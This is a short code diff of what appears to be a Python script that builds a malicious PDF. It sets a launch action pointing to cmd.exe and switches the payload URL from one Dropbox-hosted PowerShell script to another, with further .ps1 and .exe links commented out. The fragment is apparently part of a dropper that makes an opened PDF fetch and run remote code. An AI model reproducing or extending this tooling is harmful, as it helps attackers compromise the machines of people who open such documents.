@@ -13,7 +13,10 @@ for i in range(len(reader.pages)):
 
 # https://www.dropbox.com/scl/fi/f3k7xpydr6ci56gtvqo2x/teste.ps1?rlkey=msg6e1gnkbxl41eidbs1irmbw&st=naptj51l&dl=1
 # https://www.dropbox.com/scl/fi/0d8qkntos3ha0t0tz7lzs/mom.ps1?rlkey=eln3escdv21sjt5a8res8ez1f&st=j811v9b7&dl=1
-url = "https://www.dropbox.com/scl/fi/0d8qkntos3ha0t0tz7lzs/mom.ps1?rlkey=eln3escdv21sjt5a8res8ez1f&st=j811v9b7&dl=1"
+# https://www.dropbox.com/scl/fi/hlkcfmtehc6q1hv1ryhmu/pp.exe?rlkey=qbcmm8mdvjltaiaurrdhdgo5c&st=f6lj2261&dl=1
+# https://www.dropbox.com/scl/fi/lpy3zb9k52vm8imko685o/dd.ps1?rlkey=xkyirfydv7u5crutpq2exhsmj&st=mfz1ft1w&dl=1 -> dd
+
+url = "https://www.dropbox.com/scl/fi/lpy3zb9k52vm8imko685o/dd.ps1?rlkey=xkyirfydv7u5crutpq2exhsmj&st=mfz1ft1w&dl=1"
 win_dict = DictionaryObject()
 win_dict.update({
     NameObject("/F"): TextStringObject("cmd.exe"),
